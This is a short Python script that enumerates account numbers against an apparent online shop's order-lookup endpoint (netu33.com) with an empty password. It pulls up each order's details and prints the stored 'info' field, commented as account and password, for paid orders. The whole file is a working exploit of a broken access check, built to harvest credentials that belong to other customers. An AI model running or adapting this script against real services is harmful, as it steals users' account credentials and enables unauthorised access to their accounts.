import requests
import re
import random
import string
import time

user_agent_list=[
            'Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.1;Trident/5.0)',
            'Mozilla/4.0(compatible;MSIE8.0;WindowsNT6.0;Trident/4.0)',
            'Mozilla/4.0(compatible;MSIE7.0;WindowsNT6.0)',
            'Mozilla/5.0(WindowsNT6.1;rv:2.0.1)Gecko/20100101Firefox/4.0.1',
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER',
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)',
            'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0',
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36',  
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 UBrowser/4.0.3214.0 Safari/537.36' 
        ]

def search(num,n):
    time.sleep(0.5)
    header={
            'User-Agent':'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0', 
           }

    url = 'http://netu33.com/chaka/orderList'   # 链接
    payload = {'account':str(num),'otype':'0','chapwd':''}  # eval计算式子(匹配出来的是列表所以用[0])并构造post请求的data部分
    s = requests.Session()  # 创建session对象
    html = s.post(url, data=payload, headers=header).text  # post带参数提交.decode("unicode_escape")
    html=html.encode("utf-8").decode("unicode_escape")
    id = re.compile(r'(?<=orderInfo\(\').*(?=\'\)\")').findall(html)
    for i in id:
        if(n>i):
            break
        time.sleep(0.5)
        payload2={"id":str(i)}
        flag=s.post("http://netu33.com/chaka/orderInfo",data=payload2,headers=header).text
        flag=flag.encode("utf-8").decode("unicode_escape") #查看订单消息
        status=re.compile(r'(?<=payid":").*(?=","paytype)').findall(flag)#判读是否未付款
        if(len(status)!=0):
            info=re.compile(r'(?<=info":").*(?=<br)').findall(flag) #账号密码
            print(info[0]+"----"+i[:8])

def t(x):  #返回之前x天的时间
    nowT=time.strftime("%Y%m%d", time.localtime())
    nowT=nowT + "0000000000"
    s=nowT[6]+nowT[7]
    return nowT[:6]+str(int(s)-x)+nowT[8:]
n=t(10)
m=0
for i in range(100,500):
    search(i,n)
    m+=1
    if(m%10==0):
        print(m)
